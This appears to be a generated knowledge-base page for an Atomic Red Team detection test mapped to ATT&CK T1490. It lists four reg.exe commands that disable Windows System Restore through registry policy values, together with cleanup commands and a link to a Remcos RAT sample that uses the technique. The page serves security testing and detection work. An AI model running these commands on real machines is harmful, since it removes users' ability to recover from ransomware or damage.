---
atomic_guid: "66e647d1-8741-4e43-b7c1-334760c2047f"
title: "Disable System Restore Through Registry"
framework: "atomic"
generated: "true"
attack_technique_id: "T1490"
attack_technique_name: "Inhibit System Recovery"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "66e647d1-8741-4e43-b7c1-334760c2047f"
  - "Disable System Restore Through Registry"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Disable System Restore Through Registry

Modify the registry of the currently logged in user using reg.exe via cmd console to disable system restore on the computer. 
See how remcos RAT abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details

## Metadata

- Atomic GUID: 66e647d1-8741-4e43-b7c1-334760c2047f
- Technique: T1490: Inhibit System Recovery
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1490/T1490.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1490-inhibit_system_recovery|T1490]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
```

### Cleanup

```commandprompt
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /f >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /f >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.yaml)
